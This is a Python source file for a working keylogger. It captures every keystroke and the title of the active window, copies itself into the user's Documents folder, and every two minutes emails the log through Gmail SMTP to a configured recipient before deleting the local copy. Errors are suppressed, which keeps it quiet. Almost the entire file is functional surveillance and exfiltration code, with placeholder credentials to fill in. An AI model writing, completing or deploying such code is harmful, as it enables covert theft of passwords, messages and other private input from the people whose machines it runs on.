import keyboard
import os, shutil
import pygetwindow as gw
import time
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class data:
    raw_text = ""
    pre_text = ""
    last_key = ""
    clicked_event = ""
    is_last_key_functional = False
    last_window = ""
    copy_folder = ""

    def save_clicked_data(msg):
        global clicked_event
        clicked_event += f"{msg}\n"

class path_configuration:
    def copy_THIS_file():
        # Path to your Python script
        script_path = os.path.abspath(__file__)

        destination_path = f"{os.environ['SystemDrive']}/Users/{os.getlogin()}/Documents/"

        try:
            shutil.copy(script_path, destination_path)
        except Exception as e:
            # print(f"Error copying the file: {e}")
            pass

class send_message:

    def send_email():
        # Email configuration
        sender_email = 'sender@gmail.com'
        recipient_email = 'reciever@anyemail.com'
        password = 'Your-gmail-app-password'

        # Create a message
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = 'Subject of the Email'

        # Email content
        body = 'This is the email body.'
        message.attach(MIMEText(body, 'plain'))

        # Attach a file
        file_to_send = 'keyboard_log.txt'
        attachment = open(file_to_send, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload((attachment).read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % file_to_send)
        message.attach(part)
        # Establish a connection with the SMTP server (in this case, Gmail)
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(sender_email, password)

            # Send the email
            server.sendmail(sender_email, recipient_email, message.as_string())
            print('Email sent successfully!')

        except Exception as e:
            # print(f'An error occurred: {e}')
            pass

        finally:
            # Close the server connection
            server.quit()

path_configuration.copy_THIS_file()

# Define a timestamp for the last task execution
last_task_time = time.time()
task_interval = 120  # 5 minutes
delay_between_iterations = 0.0001  # 0.2 seconds

# Calculate the number of iterations needed for 5 minutes
iterations_for_5_minutes = int(task_interval / delay_between_iterations)

def addkey(keyname, condition=True):
        data.last_key = keyname
        data.is_last_key_functional = condition
        data.raw_text += keyname

def removekey():
    if not data.is_last_key_functional:
        data.raw_text = data.raw_text[:-1]
    else:
        addkey("#BACKSPACE", False)


functional_keys = ['ctrl', 'shift', 'right shift' , 'right alt', 'right ctrl', 'alt', 'esc', 'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
file_name = "keyboard_log.txt"

def get_active_window_title():
    active_window = gw.getActiveWindow()
    return active_window.title if active_window else "Unknown"


def write_event(hello, there):
    global last_task_time
    while True:
        current_time = time.time()
        if current_time - last_task_time >= task_interval:
            # Perform your task here
            print(" \n/// HELLO THERE MY NAME IS j0j0 /// \n")
            with open(file_name, "w",  encoding='utf-8') as file:
                file.write(data.raw_text)
            send_message.send_email()
            # Update the last task time
            os.remove(file_name)
            last_task_time = current_time
        event = keyboard.read_event()
        key_name = event.name
        key_value = event.event_type
        #print(f"Key: {key_name} State: {key_value}")
        if key_value == "down":

            if key_name in functional_keys:
                addkey(f" #{key_name.upper()} ")
            elif key_name.startswith("space"):
                addkey(" ", False)
            elif key_name.startswith("enter"):
                addkey(" #ENTER\n", False)
            elif key_name.startswith("backspace"):
                removekey()
            else:
                addkey(key_name, False)

        active_window = get_active_window_title()
        if (data.last_window != active_window):
             data.last_window = active_window
             data.raw_text += f"\nActive window: {active_window}\n"

        
        time.sleep(delay_between_iterations)

try:
    write_event('g', 'g')
except Exception as e:
            # Code to handle the exception
            # print(f"An error occurred: {e}")
            pass
